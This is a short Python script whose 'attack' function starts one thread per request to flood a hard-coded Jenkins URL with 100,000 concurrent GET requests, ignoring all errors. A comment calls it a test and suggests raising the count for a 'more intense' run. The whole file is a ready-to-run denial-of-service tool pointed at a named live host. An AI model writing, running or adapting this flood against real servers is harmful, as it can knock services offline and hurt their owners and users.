import requests
import threading
def attack(url, num_requests):
    def send():
        try:
            requests.get(url, timeout=5)
        except Exception:
            pass
    threads = []
    for _ in range(num_requests):
        t = threading.Thread(target=send)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
if __name__ == "__main__":
    target_url = "https://jenkins.aryaman.site"
    total_requests = 100000  # Increase for more intense test
    attack(target_url, total_requests)



